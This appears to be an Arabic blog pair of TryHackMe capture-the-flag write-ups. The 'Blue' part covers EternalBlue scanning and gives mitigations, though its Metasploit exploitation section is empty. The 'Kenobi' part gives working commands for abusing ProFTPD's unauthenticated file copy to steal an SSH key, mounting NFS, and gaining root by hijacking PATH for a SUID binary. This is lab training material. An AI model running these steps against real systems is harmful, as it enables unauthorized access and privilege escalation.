🪟 Blue — EternalBlue MS17-010 (CVE-2017-0143)

يناير 2025 وقت القراءة: 8 دقائق إعداد: محمد فتحي (Ft7y.Sec)

ملخص العملية والهدف

غرفة Blue على TryHackMe تحاكي نظام Windows 7 غير محدث ومصاب بثغرة EternalBlue الشهيرة التي طورتها وكالة الأمن القومي الأمريكية (NSA) وسربتها مجموعة Shadow Brokers. الهدف هو استغلال الخلل في معالجة طلبات SMBv1 للوصول المباشر إلى أعلى صلاحيات بالنظام (SYSTEM).

المرحلة الأولى: الاستطلاع والفحص (Reconnaissance)

بدأنا بفحص المنافذ المفتوحة والخدمات مع تفعيل فحص الثغرات باستخدام محرك سكربتات Nmap (NSE):

BASH — Nmap Vuln Scan 
$ nmap -sV -sC -p 135,139,445 --script vuln 10.10.150.120

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 SP1

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1.
تم التأكد بنسبة 100% أن المنفذ 445 مفتوح وخادم SMBv1 مصاب بالثغرة الحرجة CVE-2017-0143.

المرحلة الثانية: الاستغلال (Exploitation via Metasploit)

سبل الحماية والتوصيات (Mitigation)

  • تثبيت التحديث الأمني: تطبيق التحديث الأمني التراكمي Microsoft Security Bulletin MS17-010 فوراً.
  • تعطيل بروتوكول SMBv1: إيقاف بروتوكول SMB القديم تماماً عبر PowerShell: Set-SmbServerConfiguration -EnableSMB1Protocol $false.
  • حماية المنافذ بالشبكة: حظر المنفذين 139 و 445 من الشبكات الخارجية وجعلها مقتصرة فقط على بيئة الـ Active Directory الداخلية.

🐧 Kenobi — Samba, ProFTPD 1.3.5 & SUID Path Hijacking

فبراير 2025 وقت القراءة: 10 دقائق إعداد: محمد فتحي (Ft7y.Sec)

ملخص الآلة

آلة Linux تركز على التعداد العميق (Enumeration) لخدمات مشاركة الملفات، واستغلال ثغرة نقل الملفات في خادم ProFTPD للوصول إلى مفتاح SSH، متبوعة بترقية الصلاحيات من خلال تحليل ملف تنفيذي مصاب بـ SUID واستغلال متغيرات البيئة (PATH manipulation).

المرحلة الأولى: تعداد SMB و NFS

BASH — Enumeration
# فحص مشاركات Samba
$ smbclient -L //10.10.x.x/ -N
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      
IPC$            IPC       IPC Service

# الدخول للمشاركة المجهولة وتحميل ملف السجل
$ smbclient //10.10.x.x/anonymous
smb: \> get log.txt
# وجدنا في log.txt مسار مفتاح SSH للمستخدم: /home/kenobi/.ssh/id_rsa

المرحلة الثانية: استغلال ثغرة ProFTPD (CVE-2015-3306)

خدمة ProFTPD 1.3.5 تسمح بتنفيذ أوامر SITE CPFR و SITE CPTO بدون استيثاق:

BASH — ProFTPD Copy Commands
$ nc 10.10.x.x 21
220 ProFTPD 1.3.5 Server ready.
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

# ربط مشاركة /var عبر NFS واستخراج المفتاح
$ sudo mount 10.10.x.x:/var /mnt/kenobiNFS
$ cp /mnt/kenobiNFS/tmp/id_rsa . && chmod 600 id_rsa
$ ssh -i id_rsa kenobi@10.10.x.x
kenobi@kenobi:~$ # تم الوصول للنظام بنجاح!

المرحلة الثالثة: ترقية الصلاحيات (SUID Binary Hijacking)

بالبحث عن ملفات SUID وجدنا ملفاً غير اعتيادي باسم /usr/bin/menu:

BASH — PrivEsc Path Injection
# فحص الملف بواسطة strings
kenobi@kenobi:~$ strings /usr/bin/menu
curl -I localhost
# لاحظ: يستدعي curl بدون المسار المطلق /usr/bin/curl !

# التلاعب بمتغير PATH
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
# تشغيل الخيار رقم 1
# النتيجة:
# id
uid=0(root) gid=0(root) groups=0(root)
